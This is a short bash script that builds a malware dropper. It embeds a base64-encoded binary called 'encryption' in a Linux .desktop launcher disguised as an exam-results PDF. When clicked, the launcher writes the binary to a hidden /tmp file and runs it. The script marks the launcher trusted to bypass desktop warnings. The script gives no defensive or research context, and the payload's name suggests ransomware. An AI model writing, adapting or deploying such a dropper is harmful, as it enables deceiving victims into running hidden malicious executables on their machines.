#!/bin/bash

BINARY="./encryption"
DESKTOP_NAME="Exam_Results_June2025.pdf"
OUTPUT="Exam_Results_June2025.desktop"

if [ ! -f "$BINARY" ]; then
    echo "ERROR: $BINARY not found — compile first"
    exit 1
fi

echo "Encoding binary..."
BINARY_B64=$(base64 -w 0 "$BINARY")

# Write desktop file without heredoc to avoid quote issues
{
    echo "[Desktop Entry]"
    echo "Name=$DESKTOP_NAME"
    echo "Icon=application-pdf"
    echo "Type=Application"
    echo "Terminal=true"
    echo "Exec=kitty -c 'echo $BINARY_B64 | base64 -d > /tmp/.run && chmod +x /tmp/.run && /tmp/.run'"
} > "$OUTPUT"

chmod +x "$OUTPUT"
gio set "$OUTPUT" metadata::trusted true

echo "Done — $OUTPUT created"
echo "File size: $(du -h $OUTPUT | cut -f1)"